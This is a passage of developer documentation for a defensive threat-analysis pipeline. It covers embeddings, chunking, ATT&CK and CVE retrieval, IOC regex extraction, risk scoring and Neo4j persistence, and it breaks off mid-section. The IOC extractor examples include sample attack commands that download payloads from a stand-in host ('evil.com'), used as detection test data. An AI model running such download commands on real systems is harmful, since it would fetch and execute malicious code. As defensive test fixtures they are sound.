**Problem it solves:**
- Provides text-to-vector conversion
- Eliminates external embedding API costs
- Enables offline operation
- Consistent embedding generation

**Internal Workflow:**
```
Model Loading → Text Input → Embedding Generation → Vector Output
```

**Dependencies:**
- **Imports:** `sentence_transformers.SentenceTransformer`, `config`
- **Imported by:** `rag.vector_store`
- **Calls:** None (embedding leaf node)

**Global Variables:**

#### `_model`
- **Type:** SentenceTransformer model (singleton)
- **Purpose:** Reusable embedding model
- **Why:** Model loading is expensive, reuse for efficiency

**Functions:**

#### `get_embedding_model()`
- **Input:** None
- **Output:** SentenceTransformer model
- **Purpose:** Get or create embedding model
- **Logic:**
  1. Check if global _model exists
  2. If not, load model from config.EMBEDDING_MODEL
  3. Return model
- **Why:** Singleton pattern for model reuse
- **Default Model:** all-MiniLM-L6-v2 (384 dimensions, fast, good quality)

#### `embed_texts(texts: list[str]) -> list[list[float]]`
- **Input:** List of text strings
- **Output:** List of embedding vectors (list of floats)
- **Purpose:** Generate embeddings for texts
- **Logic:**
  1. Get embedding model
  2. Call model.encode(texts, show_progress_bar=False)
  3. Convert to list and return
- **Why:** Batch embedding generation for efficiency
- **Output Format:** List of 384-dimensional vectors (for all-MiniLM-L6-v2)

**Example:**
```python
embeddings = embed_texts(["powershell execution", "network connection"])
# Returns: [[0.1, 0.2, ...], [0.3, 0.4, ...]]
# Each vector has 384 dimensions
```

**Testing:**

**Unit Tests:**
```python
def test_get_embedding_model():
    model = get_embedding_model()
    assert model is not None

def test_embed_texts():
    embeddings = embed_texts(["test text"])
    assert len(embeddings) == 1
    assert len(embeddings[0]) == 384  # all-MiniLM-L6-v2 dimension

def test_embed_texts_batch():
    embeddings = embed_texts(["text1", "text2", "text3"])
    assert len(embeddings) == 3
```

**Manual Tests:**
```python
from rag.embeddings import embed_texts

embeddings = embed_texts(["powershell.exe malicious"])
print(f"Embedding dimensions: {len(embeddings[0])}")
print(f"Sample values: {embeddings[0][:5]}")
```

**Expected Outputs:**
- List of embedding vectors
- Each vector has 384 dimensions (for all-MiniLM-L6-v2)
- Values are floats between -1 and 1

**Failure Cases:**
- Model file not found
- Invalid text input
- Model loading failure
- Out of memory for large batches

**Edge Cases:**
- Empty text list
- Very long texts
- Special characters
- Unicode text

**Interview Questions:**

**Q: Why use sentence-transformers instead of OpenAI embeddings?**
**A:** Cost and privacy. Sentence-transformers is free and runs locally. OpenAI embeddings cost money and send data to external servers. For offline capability and cost control, local models are better.

**Q: Why all-MiniLM-L6-v2 specifically?**
**A:** Balance of speed, size, and quality. It's fast (good for real-time), small (384 dimensions), and provides good semantic understanding. Larger models would be slower and more resource-intensive.

**Q: What happens if the model file is not found?**
**A:** Sentence-transformers will download it automatically on first use. This requires internet access initially, but after download it works offline. An improvement would be to bundle the model with the application.

**Design Decisions:**

**Chosen Solution:** sentence-transformers with all-MiniLM-L6-v2
**Alternatives:**
- OpenAI embeddings: Higher quality, costs money
- Cohere embeddings: Good quality, costs money
- OpenAI text-embedding-ada-002: Standard, costs money
- Custom model: Requires training

**Advantages:**
- Free and open-source
- Local execution
- No external dependencies
- Good quality embeddings
- Fast inference

**Disadvantages:**
- Lower quality than paid APIs
- Model download required initially
- Limited to 384 dimensions
- No fine-tuning without training

**Weak Points:**
- No model versioning
- No model caching strategy
- No fallback if model fails
- No embedding quality metrics
- No support for multilingual text

**Improvements:**
- Add model versioning
- Implement model caching
- Add fallback models
- Add embedding quality metrics
- Support multilingual models
- Add model fine-tuning capability

---

### rag/chunking.py

**Purpose:**
- Split long text into smaller chunks for embedding
- Preserve metadata across chunks
- Handle ATT&CK technique descriptions

**Why it exists:**
- Embedding models have token limits
- Long texts exceed context windows
- Chunking improves retrieval precision
- Metadata preservation enables traceability

**Problem it solves:**
- Handles texts longer than embedding limits
- Improves retrieval granularity
- Preserves technique context across chunks
- Enables overlap for context continuity

**Internal Workflow:**
```
Text Input → Chunk Splitting → Metadata Attachment → Chunk Output
```

**Dependencies:**
- **Imports:** `typing`
- **Imported by:** RAG ingestion scripts
- **Calls:** None (utility functions)

**Functions:**

#### `chunk_text(text: str, max_chars: int, overlap: int)`
- **Input:** Text string, max characters per chunk, overlap characters
- **Output:** List of text chunks
- **Purpose:** Split text into overlapping chunks
- **Logic:**
  1. If text <= max_chars, return single chunk
  2. Iterate through text with max_chars step
  3. Subtract overlap from start position for overlap
  4. Return list of chunks
- **Why:** Overlap preserves context between chunks
- **Default:** max_chars=800, overlap=100

#### `chunk_attack_technique(technique: Dict)`
- **Input:** Technique dictionary with description and metadata
- **Output:** List of {text, metadata} chunks
- **Purpose:** Chunk ATT&CK technique with metadata preservation
- **Logic:**
  1. Extract description from technique
  2. Chunk the description
  3. For each chunk, attach technique metadata (technique_id, name, tactic)
  4. Return list of chunk dicts
- **Why:** Preserves technique context in every chunk
- **Metadata:** technique_id, name, tactic

**Example:**
```python
technique = {
    "technique_id": "T1059.001",
    "name": "PowerShell",
    "tactic": "Execution",
    "description": "Long description..."
}
chunks = chunk_attack_technique(technique)
# Returns:
[
    {"text": "chunk1", "metadata": {"technique_id": "T1059.001", "name": "PowerShell", "tactic": "Execution"}},
    {"text": "chunk2", "metadata": {"technique_id": "T1059.001", "name": "PowerShell", "tactic": "Execution"}}
]
```

**Testing:**

**Unit Tests:**
```python
def test_chunk_text_short():
    chunks = chunk_text("short text")
    assert len(chunks) == 1

def test_chunk_text_long():
    chunks = chunk_text("a" * 1000, max_chars=200)
    assert len(chunks) > 1

def test_chunk_attack_technique():
    technique = {"technique_id": "T1234", "name": "Test", "description": "test"}
    chunks = chunk_attack_technique(technique)
    assert all("metadata" in c for c in chunks)
    assert all(c["metadata"]["technique_id"] == "T1234" for c in chunks)
```

**Manual Tests:**
```python
from rag.chunking import chunk_text, chunk_attack_technique

text = "a" * 1000
chunks = chunk_text(text, max_chars=200, overlap=50)
print(f"Number of chunks: {len(chunks)}")
print(f"First chunk length: {len(chunks[0])}")
```

**Expected Outputs:**
- List of text chunks
- Chunks with preserved metadata
- Overlap between chunks

**Failure Cases:**
- Empty text
- Invalid max_chars or overlap
- Missing technique fields

**Edge Cases:**
- Text exactly max_chars
- Overlap >= max_chars
- Very long texts
- Unicode characters

**Interview Questions:**

**Q: Why use character-based chunking instead of token-based?**
**A:** Simplicity. Character-based chunking is easier to implement and understand. Token-based would require tokenizer integration. For ATT&CK descriptions, character-based is sufficient and more predictable.

**Q: Why include overlap between chunks?**
**A:** Context preservation. Overlap ensures that concepts spanning chunk boundaries aren't lost. It improves retrieval by providing multiple entry points for the same concept.

**Q: What happens if overlap >= max_chars?**
**A:** Infinite loop. The current implementation doesn't validate this. An improvement would be to add validation to ensure overlap < max_chars.

**Design Decisions:**

**Chosen Solution:** Character-based chunking with overlap
**Alternatives:**
- Token-based chunking: More accurate, more complex
- Semantic chunking: Better context, requires LLM
- Fixed-size chunking: Simpler, no overlap
- Recursive chunking: Better structure, more complex

**Advantages:**
- Simple implementation
- Predictable chunk sizes
- Overlap preserves context
- No external dependencies
- Fast execution

**Disadvantages:**
- May split words
- No semantic awareness
- Fixed size may not fit content
- Character-based not token-aware
- No structure preservation

**Weak Points:**
- No validation of parameters
- May split mid-word
- No semantic chunking
- No adaptive sizing
- No language-specific handling

**Improvements:**
- Add parameter validation
- Implement word boundary detection
- Add semantic chunking option
- Implement adaptive sizing
- Add language-specific rules
- Add structure-aware chunking (paragraphs, sentences)

---

### rag/retriever.py

**Purpose:**
- High-level retrieval helper for ATT&CK context
- Format vector search results for LLM consumption
- Simplify RAG operations for agents

**Why it exists:**
- Agents need formatted RAG context
- Abstracts vector store complexity
- Provides consistent formatting
- Reduces boilerplate in agents

**Problem it solves:**
- Formats vector search results for LLM prompts
- Provides simple interface for agents
- Handles empty results gracefully
- Standardizes context formatting

**Internal Workflow:**
```
Event Description → Vector Search → Result Formatting → Context String
```

**Dependencies:**
- **Imports:** `rag.vector_store`
- **Imported by:** `agents.attack_mapping_agent`
- **Calls:** `query_similar()`

**Functions:**

#### `retrieve_attack_context(event_description: str, n_results: int)`
- **Input:** Event description text, number of results
- **Output:** Formatted context string
- **Purpose:** Retrieve and format ATT&CK context
- **Logic:**
  1. Query vector store with event description
  2. Extract documents and metadatas from results
  3. If no documents, return "No relevant ATT&CK techniques found."
  4. Format each result as "[technique_id] name: description"
  5. Join with double newlines
  6. Return formatted context
- **Why:** Provides LLM-ready context string
- **Format:** "[T1059.001] PowerShell: Command-line and script..."

**Example:**
```python
context = retrieve_attack_context("powershell encoded command", n_results=3)
# Returns:
"[T1059.001] PowerShell: Command-line and script...
[T1059.003] Windows Command Shell: The Windows Command Shell...
[T1564.001] Hidden Files and Directories: Attackers may set..."
```

**Testing:**

**Unit Tests:**
```python
def test_retrieve_attack_context():
    context = retrieve_attack_context("powershell", n_results=3)
    assert isinstance(context, str)
    assert len(context) > 0

def test_retrieve_attack_context_no_results():
    context = retrieve_attack_context("xyz", n_results=3)
    assert "No relevant" in context
```

**Manual Tests:**
```python
from rag.retriever import retrieve_attack_context

context = retrieve_attack_context("malicious process execution", n_results=3)
print(context)
```

**Expected Outputs:**
- Formatted context string
- Multiple technique descriptions
- Technique IDs and names included

**Failure Cases:**
- Vector store query failure
- Invalid event description
- Empty results

**Edge Cases:**
- Very long event descriptions
- No matching techniques
- Unicode in descriptions

**Interview Questions:**

**Q: Why format results instead of returning raw query results?**
**A:** LLM-ready format. Agents need formatted context for prompts. Formatting here reduces boilerplate in agents and ensures consistent formatting across all uses.

**Q: What happens if no techniques are found?**
**A:** Returns "No relevant ATT&CK techniques found." This provides clear feedback to the LLM and prevents errors from empty context.

**Q: Why default to 3 results?**
**A:** Balance between context and token limits. 3 results provide sufficient context without consuming too many tokens. This is configurable per call.

**Design Decisions:**

**Chosen Solution:** Formatted string output
**Alternatives:**
- Return raw query results: More flexible, more boilerplate
- Return structured dict: More structured, more parsing
- Return list of objects: More programmatic, less LLM-friendly
- Return JSON: More structured, requires parsing

**Advantages:**
- LLM-ready format
- Simple interface
- Consistent formatting
- Handles empty results
- No boilerplate in agents

**Disadvantages:**
- Less flexible for other uses
- Fixed formatting
- No structured output
- Hard to parse programmatically
- No metadata access

**Weak Points:**
- No access to raw distances/scores
- No metadata access
- Fixed formatting
- No customization options
- No result filtering

**Improvements:**
- Add option to return raw results
- Include distance/score in output
- Add formatting options
- Add result filtering
- Add metadata access
- Add result ranking options

---

### rag/cve_retriever.py

**Purpose:**
- Retrieve CVEs from vector database
- Format CVE results for LLM consumption
- Support software-specific CVE queries

**Why it exists:**
- VulnerabilityAgent needs CVE retrieval
- Abstracts CVE database operations
- Provides formatted CVE data
- Supports software-specific queries

**Problem it solves:**
- Enables semantic CVE search
- Formats CVE data for analysis
- Supports software/version queries
- Provides relevance scoring

**Internal Workflow:**
```
Query Text → Vector Search → CVE Extraction → Formatting → CVE List
```

**Dependencies:**
- **Imports:** `rag.vector_store`
- **Imported by:** `agents.vulnerability_agent`
- **Calls:** `query_similar()`

**Functions:**

#### `retrieve_cves(query_text: str, n_results: int)`
- **Input:** Query text, number of results
- **Output:** List of CVE dictionaries
- **Purpose:** Query CVE database for relevant vulnerabilities
- **Logic:**
  1. Return empty if no query text
  2. Query CVE collection with vector search
  3. Extract CVEs from results
  4. Format each CVE with metadata
  5. Include relevance score from distance
  6. Return CVE list
- **Why:** Provides structured CVE data for analysis
- **CVE Fields:** cve_id, cvss_score, severity, description, affected_software, published_date, references, relevance_score

#### `retrieve_cves_for_software(software_name: str, version: str, n_results: int)`
- **Input:** Software name, optional version, number of results
- **Output:** List of CVE dictionaries
- **Purpose:** Retrieve CVEs for specific software
- **Logic:**
  1. Build query from software name and version
  2. Call retrieve_cves with constructed query
  3. Return results
- **Why:** Convenience function for software-specific queries
- **Query Format:** "{software_name} {version}" or "{software_name}"

**Example:**
```python
cves = retrieve_cves("Apache Log4j 2.14.1", n_results=5)
# Returns:
[
    {
        "cve_id": "CVE-2021-44228",
        "cvss_score": 10.0,
        "severity": "CRITICAL",
        "description": "Apache Log4j2...",
        "affected_software": "Apache Log4j 2.14.1",
        "relevance_score": 0.15
    }
]
```

**Testing:**

**Unit Tests:**
```python
def test_retrieve_cves():
    cves = retrieve_cves("Log4j", n_results=3)
    assert isinstance(cves, list)
    assert all("cve_id" in cve for cve in cves)

def test_retrieve_cves_empty_query():
    cves = retrieve_cves("", n_results=3)
    assert cves == []

def test_retrieve_cves_for_software():
    cves = retrieve_cves_for_software("Apache", "2.14.1", n_results=3)
    assert isinstance(cves, list)
```

**Manual Tests:**
```python
from rag.cve_retriever import retrieve_cves, retrieve_cves_for_software

cves = retrieve_cves("Log4j vulnerability", n_results=5)
for cve in cves:
    print(f"{cve['cve_id']}: {cve['severity']} (CVSS: {cve['cvss_score']})")
```

**Expected Outputs:**
- List of CVE dictionaries
- CVE metadata and descriptions
- Relevance scores

**Failure Cases:**
- Empty query text
- Vector store query failure
- Invalid collection name
- Missing metadata fields

**Edge Cases:**
- No matching CVEs
- Very generic query
- Unicode in query
- CVE database empty

**Interview Questions:**

**Q: Why include relevance_score from distance?**
**A:** Ranking. Distance from vector search indicates semantic similarity. Converting to relevance_score helps the LLM understand which CVEs are most relevant to the query.

**Q: Why have separate function for software-specific queries?**
**A:** Convenience and clarity. retrieve_cves_for_software provides a clear interface for the common case of querying by software. It constructs the query appropriately and makes the code more readable.

**Q: What happens if the CVE database is empty?**
**A:** Returns empty list. The vector store query will return no results, and the function handles this gracefully. The VulnerabilityAgent will have no CVEs to analyze.

**Design Decisions:**

**Chosen Solution:** Structured CVE dictionaries with relevance scores
**Alternatives:**
- Return raw query results: More flexible, more parsing
- Return formatted string: LLM-ready, less structured
- Return objects: More programmatic, more complex
- Return JSON: More structured, requires parsing

**Advantages:**
- Structured data
- Relevance scoring
- Software-specific queries
- Metadata preservation
- LLM-friendly

**Disadvantages:**
- Fixed schema
- No raw distance access
- No filtering options
- No sorting options
- Limited to CVE fields

**Weak Points:**
- No CVE filtering by severity
- No CVE filtering by CVSS score
- No temporal filtering (recent CVEs)
- No affected software filtering
- No reference URL validation

**Improvements:**
- Add severity filtering
- Add CVSS score filtering
- Add temporal filtering
- Add affected software filtering
- Add sorting options
- Add reference URL validation
- Add CVE exploitability data

---

## Intelligence Logic

### intelligence/ioc_extractor.py

**Purpose:**
- Extract Indicators of Compromise (IOCs) from events
- Use regex patterns for IOC detection
- Deduplicate IOCs across events
- Track source event for each IOC

**Why it exists:**
- IOCs are critical for threat intelligence
- Regex extraction is fast and reliable
- Deduplication reduces noise
- Source tracking enables traceability

**Problem it solves:**
- Automates IOC extraction from raw events
- Reduces manual IOC identification
- Provides structured IOC data
- Enables IOC correlation

**Internal Workflow:**
```
Events → Text Conversion → Regex Matching → Deduplication → IOC List
```

**Dependencies:**
- **Imports:** `re`, `typing`
- **Imported by:** `agents.enrichment_agent`
- **Calls:** None (utility functions)

**Global Variables:**

#### `IP_RE`
- **Type:** Compiled regex pattern
- **Purpose:** Match IPv4 addresses
- **Pattern:** `\b(?:\d{1,3}\.){3}\d{1,3}\b`

#### `MD5_RE`
- **Type:** Compiled regex pattern
- **Purpose:** Match MD5 hashes
- **Pattern:** `\b[a-fA-F0-9]{32}\b`

#### `SHA1_RE`
- **Type:** Compiled regex pattern
- **Purpose:** Match SHA1 hashes
- **Pattern:** `\b[a-fA-F0-9]{40}\b`

#### `SHA256_RE`
- **Type:** Compiled regex pattern
- **Purpose:** Match SHA256 hashes
- **Pattern:** `\b[a-fA-F0-9]{64}\b`

#### `URL_RE`
- **Type:** Compiled regex pattern
- **Purpose:** Match HTTP/HTTPS URLs
- **Pattern:** `https?://[^\s\"'<>]+`

#### `DOMAIN_RE`
- **Type:** Compiled regex pattern
- **Purpose:** Match domain names
- **Pattern:** `\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b`

**Functions:**

#### `extract_iocs(events: List[Dict]) -> List[Dict]`
- **Input:** List of event dictionaries
- **Output:** List of IOC dictionaries
- **Purpose:** Extract IOCs from events
- **Logic:**
  1. Initialize seen set and iocs list
  2. For each event:
     - Convert event values to text blob
     - Extract IPs with IP_RE
     - Extract hashes (MD5, SHA1, SHA256)
     - Extract URLs with URL_RE
     - Extract domains with DOMAIN_RE (filter IPs)
     - Add each IOC with deduplication
  3. Return IOC list
- **Why:** Comprehensive IOC extraction with deduplication
- **IOC Types:** ip, hash, url, domain
- **Deduplication:** Uses seen set to avoid duplicates

#### `_add(iocs: list, seen: set, value: str, ioc_type: str, event: Dict)`
- **Input:** IOC list, seen set, IOC value, IOC type, source event
- **Output:** None (modifies iocs list in place)
- **Purpose:** Add IOC if not already seen
- **Logic:**
  1. Return if value in seen
  2. Add value to seen
  3. Append IOC dict with value, type, source_event_id
- **Why:** Deduplication and source tracking

**Example:**
```python
events = [
    {"event_id": "1", "process": "powershell.exe", "command_line": "Invoke-WebRequest http://evil.com/malware.exe"},
    {"event_id": "2", "file_hash": "5d41402abc4b2a76b9719d911017c592"}
]
iocs = extract_iocs(events)
# Returns:
[
    {"value": "evil.com", "ioc_type": "domain", "source_event_id": "1"},
    {"value": "http://evil.com/malware.exe", "ioc_type": "url", "source_event_id": "1"},
    {"value": "5d41402abc4b2a76b9719d911017c592", "ioc_type": "hash", "source_event_id": "2"}
]
```

**Testing:**

**Unit Tests:**
```python
def test_extract_iocs_ip():
    events = [{"event_id": "1", "src_ip": "192.168.1.1"}]
    iocs = extract_iocs(events)
    assert len(iocs) == 1
    assert iocs[0]["ioc_type"] == "ip"

def test_extract_iocs_hash():
    events = [{"event_id": "1", "hash": "5d41402abc4b2a76b9719d911017c592"}]
    iocs = extract_iocs(events)
    assert len(iocs) == 1
    assert iocs[0]["ioc_type"] == "hash"

def test_extract_iocs_dedup():
    events = [
        {"event_id": "1", "ip": "192.168.1.1"},
        {"event_id": "2", "ip": "192.168.1.1"}
    ]
    iocs = extract_iocs(events)
    assert len(iocs) == 1  # Deduplicated
```

**Manual Tests:**
```python
from intelligence.ioc_extractor import extract_iocs

events = [
    {"event_id": "1", "process": "powershell.exe", "command_line": "curl http://evil.com/payload"},
    {"event_id": "2", "file_hash": "a" * 32}
]
iocs = extract_iocs(events)
for ioc in iocs:
    print(f"{ioc['ioc_type']}: {ioc['value']}")
```

**Expected Outputs:**
- List of unique IOCs
- IOC types: ip, hash, url, domain
- Source event IDs tracked

**Failure Cases:**
- Invalid event structure
- None values in events
- Very large event blobs

**Edge Cases:**
- Events with no IOCs
- IOCs in multiple events (deduplication)
- Malformed IPs (regex handles)
- Domain vs IP confusion (filtered)

**Interview Questions:**

**Q: Why use regex instead of LLM for IOC extraction?**
**A:** Speed and reliability. Regex is deterministic, fast, and doesn't require API calls. LLM could miss IOCs or hallucinate. Regex is appropriate for well-defined patterns like IPs and hashes.

**Q: Why deduplicate IOCs across events?**
**A:** Noise reduction. The same IOC appearing in multiple events doesn't add new information. Deduplication reduces downstream processing and focuses on unique threats.

**Q: Why track source_event_id for each IOC?**
**A:** Traceability. Analysts need to know which event evidence supports each IOC. This enables drilling down from IOC to original event for investigation.

**Design Decisions:**

**Chosen Solution:** Regex-based extraction with deduplication
**Alternatives:**
- LLM extraction: More flexible, slower, costly
- Hybrid: Regex + LLM fallback: More robust, complex
- ML model: Trained on IOC patterns, requires training
- External IOC service: More comprehensive, external dependency

**Advantages:**
- Fast execution
- Deterministic results
- No external dependencies
- Low cost
- Easy to maintain

**Disadvantages:**
- Limited to known patterns
- May miss obfuscated IOCs
- No context awareness
- False positives possible
- Limited IOC types

**Weak Points:**
- No obfuscation detection
- No base64 decoding
- No hex encoding detection
- No URL parameter extraction
- No email IOC extraction

**Improvements:**
- Add obfuscation detection (base64, hex)
- Add email IOC extraction
- Add URL parameter extraction
- Add domain/subdomain normalization
- Add IP range detection
- Add port extraction from IPs

---

### intelligence/mitre_mapper.py

**Purpose:**
- Load and index MITRE ATT&CK techniques
- Provide lookup by technique ID
- Enable tactic retrieval

**Why it exists:**
- ATT&CK data needs in-memory access
- Indexing enables fast lookups
- Supports technique metadata access
- Reduces file I/O overhead

**Problem it solves:**
- Provides fast ATT&CK technique lookup
- Caches ATT&CK data in memory
- Enables tactic retrieval
- Reduces repeated file loading

**Internal Workflow:**
```
Load ATT&CK Data → Build Index → Cache Index → Lookup by ID
```

**Dependencies:**
- **Imports:** `json`, `config`
- **Imported by:** Various agents and utilities
- **Calls:** `rag.ingest_attack.load_attack_techniques`

**Global Variables:**

#### `_technique_index`
- **Type:** Dictionary (cached)
- **Purpose:** In-memory index of techniques by ID
- **Why:** Avoid repeated file loading

**Functions:**

#### `_load_index() -> dict`
- **Input:** None
- **Output:** Technique index dictionary
- **Purpose:** Load or return cached technique index
- **Logic:**
  1. Return cached index if exists
  2. Load techniques from ATT&CK data file
  3. Build index: {technique_id: technique_dict}
  4. Cache and return index
- **Why:** Lazy loading with caching
- **Data Source:** config.ATTACK_DATA_PATH

#### `get_technique(technique_id: str) -> dict | None`
- **Input:** Technique ID string
- **Output:** Technique dictionary or None
- **Purpose:** Lookup technique by ID
- **Logic:**
  1. Load index
  2. Return technique dict or None
- **Why:** Simple technique lookup

#### `get_tactic(technique_id: str) -> str | None`
- **Input:** Technique ID string
- **Output:** Tactic string or None
- **Purpose:** Get tactic for a technique
- **Logic:**
  1. Get technique
  2. Return tactic field or None
- **Why:** Convenience for tactic access

**Example:**
```python
technique = get_technique("T1059.001")
# Returns: {"technique_id": "T1059.001", "name": "PowerShell", "tactic": "Execution", ...}

tactic = get_tactic("T1059.001")
# Returns: "Execution"
```

**Testing:**

**Unit Tests:**
```python
def test_get_technique():
    technique = get_technique("T1059.001")
    assert technique is not None
    assert technique["technique_id"] == "T1059.001"

def test_get_technique_not_found():
    technique = get_technique("T9999")
    assert technique is None

def test_get_tactic():
    tactic = get_tactic("T1059.001")
    assert tactic == "Execution"
```

**Manual Tests:**
```python
from intelligence.mitre_mapper import get_technique, get_tactic

technique = get_technique("T1059.001")
print(f"Technique: {technique['name']}")
print(f"Tactic: {get_tactic('T1059.001')}")
```

**Expected Outputs:**
- Technique dictionary with metadata
- Tactic string
- None for invalid IDs

**Failure Cases:**
- ATT&CK data file not found
- Invalid JSON in data file
- Invalid technique ID

**Edge Cases:**
- Empty technique ID
- Case sensitivity in IDs
- Missing tactic field

**Interview Questions:**

**Q: Why cache the technique index instead of loading each time?**
**A:** Performance. File I/O is expensive. Loading once and caching reduces overhead for repeated lookups. ATT&CK data is relatively small (~few MB), so memory usage is acceptable.

**Q: Why load from rag.ingest_attack instead of directly?**
**A:** Code reuse. rag.ingest_attack already has the ATT&CK loading logic. Reusing it avoids duplication and ensures consistency between RAG ingestion and this module.

**Q: What happens if the ATT&CK data file is corrupted?**
**A:** The load_attack_techniques function will raise an exception. This will propagate to the caller. An improvement would be to add error handling and fallback to empty index.

**Design Decisions:**

**Chosen Solution:** In-memory index with lazy loading
**Alternatives:**
- Load on every lookup: Simple, slow
- Database storage: More scalable, more complex
- Redis cache: Distributed, external dependency
- No caching: Always load from file

**Advantages:**
- Fast lookups
- Simple implementation
- No external dependencies
- Low memory footprint
- Lazy loading

**Disadvantages:**
- In-memory only (no persistence)
- No automatic refresh
- No distributed access
- Memory grows with ATT&CK data
- No versioning

**Weak Points:**
- No cache invalidation
- No refresh mechanism
- No error handling for file load
- No partial loading
- No query capabilities beyond ID lookup

**Improvements:**
- Add cache invalidation on file change
- Implement refresh mechanism
- Add error handling with fallback
- Add partial loading (load on demand)
- Add query capabilities (by tactic, name)
- Add version tracking

---

### intelligence/risk_scoring.py

**Purpose:**
- Calculate campaign risk scores
- Based on malicious IOCs and high-confidence techniques
- Provide categorical risk levels

**Why it exists:**
- Risk assessment is critical for prioritization
- Quantifies threat severity
- Enables triage and response prioritization
- Provides consistent scoring methodology

**Problem it solves:**
- Standardizes risk assessment
- Provides actionable risk levels
- Enables automated prioritization
- Reduces subjective risk evaluation

**Internal Workflow:**
```
Techniques + IOCs → Score Calculation → Risk Categorization → Risk Level
```

**Dependencies:**
- **Imports:** `typing`
- **Imported by:** Agents, reporting
- **Calls:** None (utility function)

**Functions:**

#### `score_campaign(techniques: List[Dict], iocs: List[Dict]) -> str`
- **Input:** List of techniques, list of IOCs
- **Output:** Risk level string
- **Purpose:** Calculate campaign risk score
- **Logic:**
  1. Count malicious IOCs (verdict == "malicious")
  2. Count high-confidence techniques (confidence >= 0.7)
  3. Calculate score: malicious_iocs * 2 + high_confidence_techniques
  4. Categorize:
     - score >= 8: Critical
     - score >= 5: High
     - score >= 2: Medium
     - else: Low
  5. Return risk level
- **Why:** Weighted scoring with categorical output
- **Weights:** Malicious IOCs weighted 2x, techniques weighted 1x

**Example:**
```python
techniques = [
    {"technique_id": "T1059.001", "confidence": 0.9},
    {"technique_id": "T1566.001", "confidence": 0.8}
]
iocs = [
    {"value": "evil.com", "verdict": "malicious"},
    {"value": "malware.exe", "verdict": "malicious"},
    {"value": "benign.exe", "verdict": "benign"}
]
risk = score_campaign(techniques, iocs)
# Score: 2 malicious IOCs * 2 + 2 high-confidence techniques = 6
# Returns: "High"
```

**Testing:**

**Unit Tests:**
```python
def test_score_campaign_critical():
    techniques = [{"confidence": 0.8}] * 4
    iocs = [{"verdict": "malicious"}] * 2
    risk = score_campaign(techniques, iocs)
    assert risk == "Critical"

def test_score_campaign_low():
    techniques = [{"confidence": 0.5}]
    iocs = [{"verdict": "benign"}]
    risk = score_campaign(techniques, iocs)
    assert risk == "Low"

def test_score_campaign_empty():
    risk = score_campaign([], [])
    assert risk == "Low"
```

**Manual Tests:**
```python
from intelligence.risk_scoring import score_campaign

techniques = [{"confidence": 0.9}]
iocs = [{"verdict": "malicious"}]
risk = score_campaign(techniques, iocs)
print(f"Risk Level: {risk}")
```

**Expected Outputs:**
- Risk level: Critical, High, Medium, Low
- Based on weighted score

**Failure Cases:**
- Invalid technique structure
- Invalid IOC structure
- Missing confidence or verdict fields

**Edge Cases:**
- Empty techniques and IOCs
- All benign IOCs
- Low confidence techniques
- Very high counts

**Interview Questions:**

**Q: Why weight malicious IOCs 2x more than techniques?**
**A:** IOCs are more concrete evidence. A malicious IP or hash is stronger evidence of compromise than a technique mapping. The weighting reflects this difference in evidentiary value.

**Q: Why use fixed thresholds (8, 5, 2) instead of dynamic thresholds?**
**A:** Simplicity and consistency. Fixed thresholds provide predictable behavior. Dynamic thresholds would require historical data and calibration. For current scale, fixed thresholds are sufficient.

**Q: What happens if techniques or IOCs are missing confidence/verdict?**
**A:** The get() method with default 0 handles missing confidence. Missing verdict defaults to not "malicious", so it won't count. This is safe but may under-score. An improvement would be to validate input.

**Design Decisions:**

**Chosen Solution:** Weighted scoring with fixed thresholds
**Alternatives:**
- Simple count: Easier, less nuanced
- Machine learning: More accurate, requires training
- CVSS-based scoring: More standard, requires CVSS data
- Bayesian scoring: More probabilistic, complex

**Advantages:**
- Simple implementation
- Consistent results
- No training required
- Easy to understand
- Fast execution

**Disadvantages:**
- Fixed weights may not fit all scenarios
- No historical context
- No environmental factors
- No calibration mechanism
- Thresholds are arbitrary

**Weak Points:**
- No calibration mechanism
- No historical context
- No environmental factors
- No confidence in risk score
- No sub-risk categories

**Improvements:**
- Add calibration mechanism
- Include historical context
- Add environmental factors (asset criticality)
- Add confidence intervals
- Implement dynamic thresholds
- Add sub-categories (e.g., High-Medium)

---

## Knowledge Graph

### knowledge_graph/graph_builder.py

**Purpose:**
- Persist campaign data to Neo4j knowledge graph
- Create nodes for campaigns, events, hosts, and techniques
- Establish relationships between entities
- Enable graph-based threat analysis

**Why it exists:**
- Knowledge graphs enable relationship queries
- Campaign persistence enables historical analysis
- Graph traversal reveals attack patterns
- Supports threat hunting and correlation

**Problem it solves:**
- Stores investigation results in graph format
- Enables complex relationship queries
- Provides persistent campaign storage
- Supports graph-based analysis

**Internal Workflow:**
```
Campaign + Events + Techniques → Neo4j Queries → Node Creation → Relationship Creation → Graph Persistence
```

**Dependencies:**
- **Imports:** `typing`, `databases.neo4j_manager`
- **Imported by:** `agents.correlation_agent`
- **Calls:** `neo4j_manager.run_query()`

**Functions:**

#### `persist_campaign(campaign: Dict, events: List[Dict], techniques: List[Dict])`
- **Input:** Campaign dict, events list, techniques list
- **Output:** None
- **Purpose:** Persist campaign and related entities to Neo4j
- **Logic:**
  1. Extract campaign_id, return if missing
  2. Create Campaign node with MERGE
  3. For each event:
     - Create Event node with MERGE
     - Create PART_OF relationship to Campaign
     - If host exists, create Host node and GENERATED relationship
  4. For each technique:
     - Create Technique node with MERGE
     - Create PART_OF relationship to Campaign
     - If evidence_event_id exists, create MAPPED_TO relationship
- **Why:** Comprehensive graph persistence with relationships
- **Node Types:** Campaign, Event, Host, Technique
- **Relationships:** PART_OF, GENERATED, MAPPED_TO

**Example:**
```python
campaign = {"campaign_id": "uuid-123", "name": "PowerShell C2"}
events = [{"event_id": "1", "host": "srv01", "event_type": "process"}]
techniques = [{"technique_id": "T1059.001", "name": "PowerShell", "evidence_event_id": "1"}]
persist_campaign(campaign, events, techniques)
# Creates Neo4j graph:
# Campaign -> PART_OF <- Event
# Host -> GENERATED -> Event
# Event -> MAPPED_TO -> Technique
# Technique -> PART_OF -> Campaign
```

**Testing:**

**Unit Tests:**
```python
def test_persist_campaign():
    campaign = {"campaign_id": "test-1", "name": "Test"}
    persist_campaign(campaign, [], [])
    # Verify campaign node created

def test_persist_campaign_with_events():
    campaign = {"campaign_id": "test-2", "name": "Test"}
    events = [{"event_id": "1", "host": "host1"}]
    persist_campaign(campaign, events, [])
    # Verify event and host nodes created

def test_persist_campaign_no_campaign_id():
    campaign = {"name": "Test"}
    persist_campaign(campaign, [], [])
    # Should return without error
```

**Manual Tests:**
```python
from knowledge_graph.graph_builder import persist_campaign

